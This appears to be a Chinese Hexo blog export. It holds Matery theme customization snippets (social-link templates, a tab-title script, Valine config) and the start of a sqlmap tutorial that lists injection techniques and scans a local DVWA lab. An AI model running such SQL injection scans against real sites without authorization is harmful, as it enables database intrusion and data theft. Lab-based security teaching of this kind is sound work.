        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-qq<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.weibo)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.weibo %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>关注我的微博: &lt;%<span class="token punctuation">=</span> theme.socialLink.weibo %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-weibo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.zhihu)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.zhihu %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>关注我的知乎: &lt;%<span class="token punctuation">=</span> theme.socialLink.zhihu %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-zhihu1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>知<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.rss)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%- url_for(<span class="token punctuation">'</span>/atom.xml<span class="token punctuation">'</span>) %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>RSS 订阅<span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fas fa-rss<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>



<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.jianshu)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.jianshu %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>关注我的简书: &lt;%<span class="token punctuation">=</span> theme.socialLink.jianshu %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-jianshu<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>简<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.csdn)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.csdn %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>关注我的CSDN: &lt;%<span class="token punctuation">=</span> theme.socialLink.csdn %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-csdn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>C<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.juejin)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.juejin %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>关注我的掘金: &lt;%<span class="token punctuation">=</span> theme.socialLink.juejin %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-juejin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>掘<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.cnblogs)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.cnblogs %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>关注我的博客园: &lt;%<span class="token punctuation">=</span> theme.socialLink.cnblogs %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-juejin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>博<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.weixin)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.weixin %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>微信联系我: &lt;%<span class="token punctuation">=</span> theme.socialLink.weixin %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-weixin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="其他一些个性DIY"><a href="#其他一些个性DIY" class="headerlink" title="其他一些个性DIY"></a>其他一些个性DIY</h3><h4 id="动态标题"><a href="#动态标题" class="headerlink" title="动态标题"></a>动态标题</h4><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121165222.png" alt="img"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121165223.png" alt="img"></p>
<p>实现方法，引入 js 文件，在主题文件下的 /source/js/ 下新建 FunnyTitle.js，增加以下代码：</p>
<pre class="line-numbers language-js"><code class="language-js"> <span class="token keyword">var</span> OriginTitle <span class="token operator">=</span> document<span class="token punctuation">.</span>title<span class="token punctuation">;</span>
 <span class="token keyword">var</span> titleTime<span class="token punctuation">;</span>
 document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'visibilitychange'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>hidden<span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'[rel="icon"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">,</span> <span class="token string">"https://cdn.jsdelivr.net/gh/guixinchn/image/blog/favicon.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'我相信你还会回来的！'</span><span class="token punctuation">;</span>
         <span class="token function">clearTimeout</span><span class="token punctuation">(</span>titleTime<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
     <span class="token keyword">else</span> <span class="token punctuation">{</span>
         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'[rel="icon"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">,</span> <span class="token string">"https://cdn.jsdelivr.net/gh/guixinchn/image/blog/favicon.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'哈哈，我就知道！'</span> <span class="token operator">+</span> OriginTitle<span class="token punctuation">;</span>
         titleTime <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             document<span class="token punctuation">.</span>title <span class="token operator">=</span> OriginTitle<span class="token punctuation">;</span>
         <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后在添加到 themes/matery/layout/layout.ejs 引入</p>
<script src="<%- theme.jsDelivr.url %><%- url_for('/js/FunnyTitle.js') %>"></script>

<h4 id="关于我页面添加个人简历"><a href="#关于我页面添加个人简历" class="headerlink" title="关于我页面添加个人简历"></a>关于我页面添加个人简历</h4><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121165224.png" alt="img"></p>
<p>打开 theme/matery/layout/about.ejs 文件，大约在 13 行。有一个 `` 标签，找出其对应结尾的标签，大约在 61 行左右，然后在新增如下代码：</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card-content article-card-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>title center-align<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zoom-in-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fa fa-address-book<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%-</span> <span class="token attr-name">__('个人简历')</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>articleContent<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fade-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%-</span> <span class="token attr-name">page.content</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121165225.png" alt="img"></p>
<p>可以在about页面自定义内容</p>
<h3 id="修改网站背景图"><a href="#修改网站背景图" class="headerlink" title="修改网站背景图"></a>修改网站背景图</h3><p>主题配置文件</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">background</span><span class="token punctuation">:</span>
  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">url</span><span class="token punctuation">:</span> <span class="token string">"https://gitee.com/marmalade0/images/blob/master/www.marmalade.vip/24.jpg"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="valine评论模块配置"><a href="#valine评论模块配置" class="headerlink" title="valine评论模块配置"></a>valine评论模块配置</h3><p>主题配置文件找到valine部分，按以下要求配置</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">valine</span><span class="token punctuation">:</span>
  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">appId</span><span class="token punctuation">:</span> xxxxxxxx <span class="token comment" spellcheck="true"># Your leancloud application appid# 将应用key的App ID设置在这里</span>
  <span class="token key atrule">appKey</span><span class="token punctuation">:</span> xxxxxxx <span class="token comment" spellcheck="true"># Your leancloud application appkey# 将应用key的App Key设置在这里</span>
  <span class="token key atrule">notify</span><span class="token punctuation">:</span> <span class="token boolean important">true </span><span class="token comment" spellcheck="true"># Mail notifier邮箱通知 , https://github.com/xCss/Valine/wiki，默认为false</span>
  <span class="token key atrule">verify</span><span class="token punctuation">:</span> <span class="token boolean important">true </span><span class="token comment" spellcheck="true"># Verification code验证码 默认为false</span>
  <span class="token key atrule">avatar</span><span class="token punctuation">:</span> <span class="token string">'mm'</span> <span class="token comment" spellcheck="true"># Gravatar style : mm/identicon/monsterid/wavatar/retro/hide</span>
  <span class="token key atrule">placeholder</span><span class="token punctuation">:</span> 想说点啥？Just go go ^_^ <span class="token comment" spellcheck="true"># Comment box placeholder# 初始化评论显示，根据自己修改，这里默认</span>
  <span class="token key atrule">background</span><span class="token punctuation">:</span> /medias/comment_bg.png
  <span class="token key atrule">guest_info</span><span class="token punctuation">:</span> nick<span class="token punctuation">,</span>mail<span class="token punctuation">,</span>link <span class="token comment" spellcheck="true"># Custom comment header# 自定义评论标题</span>
  <span class="token key atrule">pageSize</span><span class="token punctuation">:</span> <span class="token number">10 </span><span class="token comment" spellcheck="true"># Pagination size# 分页大小，10页就自动分页</span>
  <span class="token key atrule">language</span><span class="token punctuation">:</span> zh<span class="token punctuation">-</span>cn <span class="token comment" spellcheck="true"># Language, available values: en, zh-cn</span>
  <span class="token key atrule">visitor</span><span class="token punctuation">:</span> <span class="token boolean important">true </span><span class="token comment" spellcheck="true"># Article reading statistic# 是否允许游客评论 ，进入官网查看设置：https://valine.js.org/visitor.html</span>
  <span class="token key atrule">comment_count</span><span class="token punctuation">:</span> <span class="token boolean important">true </span><span class="token comment" spellcheck="true"># If false, comment count will only be displayed in post page, not in home page</span>
  <span class="token key atrule">recordIP</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># Whether to record the commenter IP</span>
  <span class="token key atrule">serverURLs</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># When the custom domain name is enabled, fill it in here (it will be detected automatically by default, no need to fill in)</span>
  <span class="token comment" spellcheck="true">#post_meta_order: 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>hexo+github博客建立与美化</category>
      </categories>
      <tags>
        <tag>Matery主题美化</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap工具基础用法详解</title>
    <url>/sqlmapbasicuse.html</url>
    <content><![CDATA[<h6 id="1-主要功能："><a href="#1-主要功能：" class="headerlink" title="1.主要功能："></a>1.主要功能：</h6><p>一个用来做sql注入攻击的工具。<br>扫描、发现、利用给定的url的sql注入漏洞，内置许多绕过插件。</p>
<blockquote>
<p>注意：需要python2才能运行，python3不可</p>
</blockquote>
<p><a href="http://sqlmap.org/">sqlmap工具压缩包官方下载地址</a></p>
<span id="more"></span>
<h6 id="2-支持的数据库："><a href="#2-支持的数据库：" class="headerlink" title="2.支持的数据库："></a>2.支持的数据库：</h6><p>mysql、oracle、sql server、access、DB2、sqlite、postgresql、Firebird、sybase、sap maxDB。</p>
<h6 id="3-采用5种注入技术："><a href="#3-采用5种注入技术：" class="headerlink" title="3.采用5种注入技术："></a>3.采用5种注入技术：</h6><p>[1]基于布尔的盲注：根据返回页面判断条件真假<br>[2]基于时间的盲注：使用条件语句查看时间延迟语句是否执行（页面返回时间是否增加）<br>[3]基于报错注入：返回错误信息，或将注入语句的结果返回页面中<br>[4]联合查询注入：在允许使用union的情况下注入<br>[5]堆查询注入：同时执行多条语句注入</p>
<h6 id="4-用法"><a href="#4-用法" class="headerlink" title="4.用法"></a>4.用法</h6><blockquote>
<p>以DVWA的low等级为实验网站,url为<code>http://127.0.0.1/DVWA-master/vulnerabilities/sqli/</code></p>
</blockquote>
<p><strong>(1)判断是否有注入点</strong><br>首先三步拿到url<br><img src="/images/sqlmapbasicuse/1.png" alt="03d75491bfd3b0989cda112f18a5626b.png"></p>
<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py  -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>注：当注入点后的参数大于等于两个时，需要加双引号</p>
</blockquote>
<p>如果出现以下结果则表明sqlmap检测到有可以注入的地方</p>
